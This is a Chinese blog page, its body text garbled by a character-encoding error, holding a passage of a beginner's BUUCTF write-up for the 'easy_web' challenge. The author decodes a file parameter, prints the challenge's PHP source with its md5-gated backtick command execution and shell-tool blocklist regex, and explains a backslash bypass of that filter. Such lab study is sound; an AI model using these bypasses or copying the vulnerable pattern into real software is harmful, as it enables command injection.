

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="notbad3">
  <meta name="keywords" content="The quieter you become,the more you are able to hear">
  
    <meta name="description" content="åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•">
<meta property="og:type" content="article">
<meta property="og:title" content="BuuCTFåšé¢˜è®°å½•_2">
<meta property="og:url" content="http://example.com/2023/10/30/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/index.html">
<meta property="og:site_name" content="rdj&#39;s Blog">
<meta property="og:description" content="åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/anxunbei1.png">
<meta property="og:image" content="http://example.com/img/anxunbei3.png">
<meta property="og:image" content="http://example.com/img/anxunbei2.png">
<meta property="og:image" content="http://example.com/img/db1.png">
<meta property="og:image" content="http://example.com/img/db2.png">
<meta property="og:image" content="http://example.com/img/flagpy1.png">
<meta property="og:image" content="http://example.com/img/flagpy2.png">
<meta property="og:image" content="http://example.com/img/flagpy3.png">
<meta property="og:image" content="http://example.com/img/us1.png">
<meta property="og:image" content="http://example.com/img/unishop2.png">
<meta property="og:image" content="http://example.com/img/unishop3.png">
<meta property="og:image" content="http://example.com/img/unishop4.png">
<meta property="og:image" content="http://example.com/img/nmap1.png">
<meta property="og:image" content="http://example.com/img/namp2.png">
<meta property="og:image" content="http://example.com/img/nmap3.png">
<meta property="og:image" content="http://example.com/img/nmap4.png">
<meta property="og:image" content="http://example.com/img/nmap5.png">
<meta property="og:image" content="http://example.com/img/real1.png">
<meta property="og:image" content="http://example.com/img/scandir2.png">
<meta property="og:image" content="http://example.com/img/scandir5-16992419265331.png">
<meta property="og:image" content="http://example.com/img/scandir4.png">
<meta property="og:image" content="http://example.com/img/scandir3.png">
<meta property="og:image" content="http://example.com/img/scandir1.png">
<meta property="og:image" content="http://example.com/img/web11-1.png">
<meta property="og:image" content="http://example.com/img/web11-2.png">
<meta property="og:image" content="http://example.com/img/web11-3.png">
<meta property="og:image" content="http://example.com/img/web11-5.png">
<meta property="og:image" content="http://example.com/img/wweb11-6.png">
<meta property="og:image" content="http://example.com/img/smarty1.png">
<meta property="og:image" content="http://example.com/img/baseconvert.png">
<meta property="og:image" content="http://example.com/img/lovemath1.png">
<meta property="og:image" content="http://example.com/img/kookie1.png">
<meta property="og:image" content="http://example.com/img/kookie2.png">
<meta property="og:image" content="http://example.com/img/kookie4.png">
<meta property="og:image" content="http://example.com/img/kookie5.png">
<meta property="og:image" content="http://example.com/img/kookie6.png">
<meta property="article:published_time" content="2023-10-30T12:08:50.000Z">
<meta property="article:modified_time" content="2023-11-07T03:17:50.517Z">
<meta property="article:author" content="notbad3">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/anxunbei1.png">
  
  
  
  <title>BuuCTFåšé¢˜è®°å½•_2 - rdj&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>notbad3</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="BuuCTFåšé¢˜è®°å½•_2"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-10-30 20:08" pubdate>
          2023å¹´10æœˆ30æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          16k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          134 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">BuuCTFåšé¢˜è®°å½•_2</h1>
            
            
              <div class="markdown-body">
                
                <p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p>
<span id="more"></span>



<hr>
<h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œ<code>URL</code>å€¼å¾—æ³¨æ„ï¼š</p>
<p><code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></p>
<p><img src="/img/anxunbei1.png" srcset="/img/loading.gif" lazyload alt="anxunbei1"></p>
<p>å³é”®æºç è¿˜å¯ä»¥å‘ç°ä¸€è¡Œå­—ï¼š<code>md5 is funny ~</code>(å’Œmd5æœ‰å…³ï¼Ÿ)ï¼Œä¼°è®¡æ˜¯è¢«è—åˆ°å›¾ç‰‡åé¢äº†ã€‚</p>
<p>å…ˆåœ¨kaliä¸‹ç”¨dirsearchæ‰«ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰å…¶å®ƒæ–‡ä»¶ï¼š</p>
<p><code>dirsearch -u http://55a28404-cd69-4529-9626-2cd4d4f499d1.node4.buuoj.cn:81/ --delay 3 -t 30</code></p>
<p>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚çœ‹çœ‹æºç ï¼š</p>
<p><img src="/img/anxunbei3.png" srcset="/img/loading.gif" lazyload alt="anxunbei3"></p>
<p>é€‰ä¸­é‚£æ®µå­—ç¬¦æç¤ºäº†base64ï¼Œåˆ©ç”¨base64è½¬å›¾ç‰‡å·¥å…·è½¬æ¢ç»“æœå°±æ˜¯å·¦ä¸Šè§’é‚£å¼ å›¾ç‰‡ã€‚ä½†å¾ˆæ˜æ˜¾URLä¸­ä¸æ˜¯è¿™ä¸ªä¸œè¥¿ï¼Œåº”è¯¥æ˜¯å°†æ–‡ä»¶åè¿›è¡Œäº†å˜åŒ–ã€‚</p>
<p>imgå‚æ•°æ˜¯å¤§å°å†™å­—æ¯åŠ æ•°å­—çš„ç»„åˆï¼ŒçŒœæµ‹æ˜¯<code>base64</code>ï¼Œè€Œä¸”éšä¾¿è¾“ä¸ª<code>abc</code>å†çœ‹æºç ä¼šå‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p>
<p><img src="/img/anxunbei2.png" srcset="/img/loading.gif" lazyload alt="anxunbei2"></p>
<p>ç›´æ¥base64è§£ç ï¼š<code>MzUzNTM1MmU3MDZlNjc=</code>ï¼Œåˆæ˜¯ä¸€ä¸²<code>base64</code>å†è§£ç ï¼š<code>3535352e706e67</code>ã€‚çœ‹ç€åƒåå…­è¿›åˆ¶ï¼Œè§£ä¸€ä¸‹ï¼š<code>555.png</code></p>
<p>ç°åœ¨è¿™ä¸ªå‚æ•°æ€ä¹ˆå‡ºæ¥çš„å°±æ¸…æ¥šäº†ï¼šå­—ç¬¦ä¸²å…ˆç»è¿‡åå…­è¿›åˆ¶ï¼Œå†ç»è¿‡ä¸¤æ¬¡base64åŠ å¯†ã€‚å‰é¢çŒœæµ‹è¿™æ˜¯ä¸ª<code>include</code>çš„å‚æ•°ï¼Œå› ä¸ºè¿™ä¸ª<code>img</code>å’Œ<code>cmd</code>å‚æ•°éƒ½æ˜¯åœ¨index.phpä¸‹çš„ï¼Œé‚£å°±ç›´æ¥çœ‹<code>index.php</code>æ˜¯å•¥ä¸œè¥¿(ç”¨åŒæ ·çš„æ–¹æ³•è½¬æ¢):img&#x3D;<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <span class="hljs-comment">//å¦‚æœä¸¤ä¸ªå‚æ•°å…¶ä¸­ä¸€ä¸ªæ²¡è¢«èµ‹å€¼</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<span class="hljs-comment">//imgè§£ç </span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<span class="hljs-comment">//æ³¨æ„^ï¼Œä¼šæ­£åˆ™åŒ¹é…éå¤§å°å†™å­—æ¯åŠæ•°å­—å’Œç‚¹ï¼Œæ¢æˆç©ºæ ¼</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//å¤§å°å†™åŒ¹é…flag</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//åˆ©ç”¨file_get_contentsè¯»ç›®æ ‡æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä½¿ç”¨base64åŠ å¯†</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<span class="hljs-comment">//ä¸€å¼€å§‹æƒ³çš„æ•°ç»„ç»•è¿‡å³$a[]=1è€Œä¸”$b[]=2ï¼Œä¸è¿‡ä»–å‰é¢æœ‰ä¸ª(string)å¼ºåˆ¶ç±»å‹è½¬æ¢(string(5) &quot;Array&quot;)ï¼Œåªèƒ½æ‰¾ç¢°æ’ç»•è¿‡äº†ã€‚</span><br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<span class="hljs-comment">//æ³¨æ„åå¼•å·ï¼Œæ‰§è¡Œå‘½ä»¤çš„ç»“æ„ç›´æ¥echo</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>æœ€å¼€å§‹æ­£åˆ™åŒ¹é…<code>\</code>é‚£é‡Œæ²¡å¼„æ˜ç™½ï¼Œä¸€å¼€å§‹è§‰å¾—<code>|\\|\\\\|</code>è¿™ä¿©ä¸œè¥¿å°±ä¼šæŠŠ<code>\</code>è¿™ä¸œè¥¿ç»™åŒ¹é…äº†ï¼Œå»ç½‘ä¸Šæœäº†wpå‘ç°éƒ½è¯´ç›´æ¥<code>l\s</code>å°±èƒ½ç»•è¿‡ã€‚åé¢å‘ç°è‡ªå·±æƒ³é”™äº†ï¼Œ<code>|\\|\\\\|</code>è¿™ä¸œè¥¿å¹¶ä¸ä¼šåŒ¹é…åˆ°<code>\</code>ï¼Œéœ€è¦<code>\\\</code>æ‰è¡Œã€‚ä¸¾ä¸ªæ —å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°\\&#x27;</span>);<span class="hljs-comment">//ä¸€ä¸ªåæ–œæ éœ€è¦å¦ä¸€ä¸ªåæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªåæ–œæ </span><br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>è¿™æ—¶æˆ‘ä»¬ä¼ <code>?b=</code>ä»»ä½•å€¼éƒ½ä¼šæŠ¥é”™ï¼š</p>
<p><code> **Warning**:  preg_match(): No ending delimiter &#39;/&#39; found in **D:\phpstudy_pro\WWW\wow.php** on line **4**</code></p>
<p>ç”µè„‘æ²¡æœ‰æ‰¾åˆ°<code>/</code>è¿™ä¸ªç»“æŸå®šç•Œç¬¦ã€‚æƒ³äº†ä¸‹åŸå› ï¼Œæ—¢ç„¶<code>\</code>è¿™ä¸ªä¸œè¥¿æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œé‚£ä¹ˆ<code>\\</code>åªä¸è¿‡æ˜¯ä¸€ä¸ªè½¬ä¹‰åçš„<code>\</code>ï¼Œè¿™ä¸ªä¸œè¥¿å’Œ<code>/</code>ç»„åˆåˆ°ä¸€èµ·ä¼šå»æ­£åˆ™åŒ¹é…<code>/</code>è¿™ä¸ªä¸œè¥¿ï¼Œè¿™æ ·ä¸€æ¥å¯¼è‡´ç¼ºå°‘å°¾éƒ¨ç•Œå®šç¬¦ã€‚ä¿®æ”¹ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\//i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>è¿™æ—¶ä¸ä¼šæŠ¥é”™è€Œä¸”å›å»æ­£åˆ™åŒ¹é…<code>/</code>ï¼Œç°åœ¨æ€è·¯å°±æ¸…æ™°äº†ï¼šå¦‚æœæˆ‘ä»¬æƒ³æ­£åˆ™åŒ¹é…<code>\</code>ï¼Œé‚£ä¹ˆå°±éœ€è¦<code>\\\</code>æ‰è¡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç°åœ¨å†çœ‹çœ‹è¿™æ®µæ­£åˆ™åŒ¹é…æ€ä¹ˆä¸ªäº‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ³¨æ„<code>|\\|\\\\|</code>ï¼Œè¿™ä¸œè¥¿ç›¸å½“äºå»åŒ¹é…<code>|\\\\</code>ã€‚å› ä¸ºå‰ä¸¤ä¸ª<code>\\</code>å›å»è½¬ä¹‰åé¢é‚£ä¸ªåˆ†éš”ç¬¦<code>|</code>ï¼Œå†åŠ ä¸Š<code>\\\\</code>ï¼Œç„¶åä»¥<code>|</code>æ”¶å°¾ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

